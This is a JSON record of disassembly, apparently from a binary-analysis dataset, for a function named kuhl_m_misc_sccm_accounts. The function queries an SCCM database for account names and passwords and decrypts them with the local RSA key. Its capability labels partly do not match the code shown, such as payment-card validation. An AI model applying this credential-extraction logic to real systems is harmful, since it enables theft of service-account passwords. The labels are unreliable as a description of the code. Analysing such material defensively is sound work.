{
  "address": "0x1400aa644",
  "rules": [
    "encrypt or decrypt via WinCrypt",
    "write file on Windows/035d57bed47747649158312e9532f27d",
    "check for time delay via GetTickCount/dcdc41ab318e4e618f624ba5aeac30b2",
    "encrypt data using Curve25519/4be2ead1b08a4c049dae9c8694881d76",
    "validate payment card number using luhn algorithm with no lookup table/f595b07566ee46b3ba7870816078c34e",
    "contain loop"
  ],
  "disassembly": [
    "mov     qword [rsp+0x8], rbx",
    "push    rbp",
    "push    rsi",
    "push    rdi",
    "sub     rsp, 0x8e0",
    "lea     rax, [rel data_140116820]  {u\"Microsoft Systems Management Ser\u2026\"}",
    "lea     r9, [rsp+0x48]",
    "lea     r8, [rel data_140116868]  {u\"keycontainer\"}",
    "mov     rbx, rdx",
    "mov     edi, ecx",
    "mov     qword [rsp+0x20], rax",
    "call    sub_140013220",
    "lea     r8, [rel data_140116888]  {u\"keyuser\"}",
    "xor     ebp, ebp",
    "xor     r9d, r9d",
    "mov     rdx, rbx",
    "mov     ecx, edi",
    "mov     qword [rsp+0x20], rbp",
    "call    sub_140013220",
    "mov     rdx, qword [rsp+0x48]",
    "neg     eax",
    "lea     rax, [rel data_1400fbfb8]  {u\"machine\"}",
    "lea     r8, [rel data_140103338]  {u\"user\"}",
    "sbb     esi, esi",
    "lea     rcx, [rel data_1401168a0]  {u\"[CRYPTO] Private Key Container: \u2026\"}",
    "not     esi",
    "and     esi, 0x20",
    "cmp     esi, 0x20",
    "cmove   r8, rax",
    "call    sub_14000c030",
    "lea     r9, [rsp+0x80]",
    "lea     r8, [rel data_1401168f8]  {u\"connectionstring\"}",
    "mov     rdx, rbx",
    "mov     ecx, edi",
    "mov     qword [rsp+0x20], rbp",
    "call    sub_140013220",
    "cmp     eax, ebp",
    "je      0x1400aab3b",
    "lea     rcx, [rel data_140117020]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0x80]",
    "lea     rcx, [rel data_140116920]  {u\"[ SQL  ] ConnectionString: %s\\n\"}",
    "call    sub_14000c030",
    "lea     edi, [rbp+0x1]",
    "lea     r8, [rsp+0x58]",
    "mov     ecx, edi",
    "xor     edx, edx",
    "call    Ordinal_ODBC32_24",
    "mov     rcx, qword [rsp+0x58]",
    "lea     r8d, [rbp+0x3]",
    "xor     r9d, r9d",
    "mov     edx, 0xc8",
    "call    Ordinal_ODBC32_75",
    "mov     rdx, qword [rsp+0x58]",
    "lea     ecx, [rbp+0x2]",
    "lea     r8, [rsp+0x50]",
    "call    Ordinal_ODBC32_24",
    "mov     r8, qword [rsp+0x80]",
    "mov     rcx, qword [rsp+0x50]",
    "mov     word [rsp+0x38], bp",
    "mov     qword [rsp+0x30], rbp",
    "lea     ebx, [rbp-0x3]",
    "xor     edx, edx",
    "mov     r9d, ebx",
    "mov     word [rsp+0x28], bp",
    "mov     qword [rsp+0x20], rbp",
    "call    Ordinal_ODBC32_141",
    "movsx   edx, ax",
    "cmp     edx, edi",
    "ja      0x1400aab05",
    "lea     rcx, [rel data_140116f90]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "mov     r8d, edx",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0x50]",
    "lea     ecx, [rbp+0x3]",
    "lea     r8, [rsp+0x40]",
    "call    Ordinal_ODBC32_24",
    "lea     rdx, [rel data_1400d5270]  {u\"SELECT SiteNumber, UserName, Pas\u2026\"}",
    "lea     rcx, [rel data_140116960]  {u\"[ SQL  ] Query to accounts: %s\\n\"}",
    "call    sub_14000c030",
    "mov     rcx, qword [rsp+0x40]",
    "lea     rdx, [rel data_1400d5270]  {u\"SELECT SiteNumber, UserName, Pas\u2026\"}",
    "mov     r8d, ebx",
    "call    Ordinal_ODBC32_111",
    "cmp     ax, bp",
    "jne     0x1400aaae2",
    "xor     eax, eax",
    "mov     rbx, qword [rsp+0x900]",
    "add     rsp, 0x8e0",
    "pop     rdi",
    "pop     rsi",
    "pop     rbp",
    "retn    ",
    "movsx   edx, ax",
    "lea     rcx, [rel data_140116f10]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "mov     r8d, edx",
    "call    sub_14000c030",
    "lea     rcx, [rel data_1401169a0]  {u\"[CRYPTO] Acquiring local SCCM RS\u2026\"}",
    "call    sub_14000c030",
    "mov     rdx, qword [rsp+0x48]",
    "lea     r9d, [rbp+0x18]",
    "lea     rcx, [rsp+0x78]",
    "or      esi, 0x40",
    "xor     r8d, r8d",
    "mov     dword [rsp+0x20], esi",
    "call    qword [rel CryptAcquireContextW]",
    "cmp     eax, ebp",
    "je      0x1400aaacc",
    "mov     rcx, qword [rsp+0x50]",
    "call    Ordinal_ODBC32_9",
    "mov     rdx, qword [rsp+0x50]",
    "mov     ecx, 0x2",
    "call    Ordinal_ODBC32_31",
    "mov     rdx, qword [rsp+0x58]",
    "mov     ecx, edi",
    "call    Ordinal_ODBC32_31",
    "jmp     0x1400aab47",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_140116e90]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "jmp     0x1400aaaf4",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "mov     rcx, qword [rsp+0x40]",
    "call    Ordinal_ODBC32_13",
    "cmp     ax, bp",
    "jne     0x1400aaaa5",
    "mov     rdx, qword [rsp+0x40]",
    "mov     ecx, 0x3",
    "call    Ordinal_ODBC32_31",
    "jmp     0x1400aab14",
    "lea     rcx, [rel data_1400d27a8]",
    "call    sub_14000c030",
    "lea     rcx, [rel data_140116e30]  {u\"[CRYPTO] Releasing local SCCM RS\u2026\"}",
    "call    sub_14000c030",
    "mov     rcx, qword [rsp+0x78]",
    "xor     edx, edx",
    "call    qword [rel CryptReleaseContext]",
    "jmp     0x1400aaaf4",
    "lea     esi, [rbp+0x4]",
    "lea     rcx, [rel data_140116da0]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "mov     rcx, qword [rsp+0x40]",
    "lea     rax, [rsp+0x90]",
    "lea     r9, [rsp+0x98]",
    "mov     qword [rsp+0x28], rax",
    "mov     r8d, edi",
    "mov     edx, 0x2",
    "mov     qword [rsp+0x20], 0x3c",
    "call    Ordinal_ODBC32_43",
    "cmp     ax, bp",
    "jne     0x1400aaa77",
    "mov     rcx, qword [rsp+0x40]",
    "lea     r9, [rsp+0x64]",
    "mov     r8d, 0xffffffee",
    "mov     edx, edi",
    "mov     qword [rsp+0x28], rbp",
    "mov     qword [rsp+0x20], rsi",
    "call    Ordinal_ODBC32_43",
    "cmp     ax, bp",
    "jne     0x1400aaa80",
    "lea     rcx, [rel data_140116d10]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "jmp     0x1400aaa87",
    "mov     rcx, qword [rsp+0x40]",
    "lea     rax, [rsp+0x88]",
    "lea     r9, [rsp+0xe0]",
    "mov     qword [rsp+0x28], rax",
    "mov     r8d, edi",
    "mov     edx, 0x3",
    "mov     qword [rsp+0x20], 0x800",
    "call    Ordinal_ODBC32_43",
    "cmp     ax, bp",
    "jne     0x1400aaa6e",
    "movsx   edx, ax",
    "mov     r8d, edx",
    "call    sub_14000c030",
    "lea     rcx, [rel data_140116c80]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "jmp     0x1400aaa87",
    "mov     rcx, qword [rsp+0x40]",
    "lea     r9, [rsp+0x910]",
    "mov     r8d, 0xfffffffa",
    "mov     edx, esi",
    "mov     qword [rsp+0x28], rbp",
    "mov     qword [rsp+0x20], rdi",
    "call    Ordinal_ODBC32_43",
    "cmp     ax, bp",
    "jne     0x1400aaa65",
    "lea     rcx, [rel data_140116be0]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "jmp     0x1400aaa87",
    "movzx   r8d, byte [rsp+0x910]",
    "mov     r9, qword [rsp+0x90]",
    "mov     edx, dword [rsp+0x64]",
    "lea     rax, [rsp+0x98]",
    "lea     rcx, [rel data_140116a00]  {u\"[%u-%hhu] %.*S - \"}",
    "mov     qword [rsp+0x20], rax",
    "call    sub_14000c030",
    "mov     edx, dword [rsp+0x88]",
    "lea     r11, [rsp+0x70]",
    "lea     r9, [rsp+0x48]",
    "lea     rcx, [rsp+0xe0]",
    "mov     r8d, esi",
    "mov     qword [rsp+0x20], r11",
    "call    sub_140005ab0",
    "cmp     eax, ebp",
    "je      0x1400aaa92",
    "mov     rcx, qword [rsp+0x40]",
    "call    Ordinal_ODBC32_13",
    "cmp     ax, bp",
    "je      0x1400aa801",
    "mov     rbx, qword [rsp+0x48]",
    "cmp     byte [rsp+0x910], bpl",
    "jne     0x1400aaa4e",
    "lea     rcx, [rel data_140116bb8]  {u\"{todo if needed} \\n\"}",
    "call    sub_14000c030",
    "mov     r8d, dword [rbx]",
    "mov     rcx, qword [rsp+0x78]",
    "lea     rax, [rsp+0x68]",
    "mov     qword [rsp+0x28], rax",
    "lea     rdx, [rbx+0x8]",
    "xor     r9d, r9d",
    "mov     dword [rsp+0x20], ebp",
    "call    qword [rel CryptImportKey]",
    "cmp     eax, ebp",
    "je      0x1400aaa38",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_140116b40]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "jmp     0x1400aaa5a",
    "mov     rcx, qword [rsp+0x68]",
    "lea     r9, [rsp+0x918]",
    "lea     r8, [rsp+0x60]",
    "mov     edx, 0x7",
    "mov     dword [rsp+0x918], esi",
    "mov     dword [rsp+0x20], ebp",
    "call    qword [rel CryptGetKeyParam]",
    "cmp     eax, ebp",
    "je      0x1400aa9a8",
    "mov     rcx, rbx",
    "call    qword [rel LocalFree]",
    "jmp     0x1400aaa92",
    "mov     eax, dword [rsp+0x70]",
    "xor     r9d, r9d",
    "mov     r8d, edi",
    "sub     eax, dword [rbx]",
    "xor     edx, edx",
    "sub     eax, 0x8",
    "mov     dword [rsp+0x918], eax",
    "mov     eax, dword [rbx]",
    "lea     rcx, [rax+rbx+0x8]",
    "lea     rax, [rsp+0x918]",
    "mov     qword [rsp+0x28], rax",
    "mov     qword [rsp+0x20], rcx",
    "mov     rcx, qword [rsp+0x68]",
    "call    qword [rel CryptDecrypt]",
    "cmp     eax, ebp",
    "je      0x1400aaa17",
    "mov     ecx, dword [rsp+0x60]",
    "call    sub_140005694",
    "lea     rcx, [rel data_140116a28]  {u\"[%s] \"}",
    "mov     rdx, rax",
    "call    sub_14000c030",
    "call    qword [rel GetLastError]",
    "lea     rcx, [rel data_140116ac0]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "mov     edx, eax",
    "call    sub_14000c030",
    "mov     edx, dword [rsp+0x918]",
    "cmp     edx, dword [rbx+0x4]",
    "jne     0x1400aaa09",
    "lea     rcx, [rel data_140116a40]  {u\"ERROR kuhl_m_misc_sccm_accounts \u2026\"}",
    "call    sub_14000c030",
    "jmp     0x1400aaa2b",
    "mov     eax, dword [rbx]",
    "lea     rcx, [rel data_1400fbf70]  {u\"%.*S\\n\"}",
    "lea     r8, [rax+rbx+0x8]",
    "call    sub_14000c030",
    "jmp     0x1400aaa2b",
    "mov     rcx, qword [rsp+0x68]",
    "call    qword [rel CryptDestroyKey]",
    "jmp     0x1400aaa5a"
  ],
  "high_level_IL": [
    "No High Level IL Loaded"
  ]
}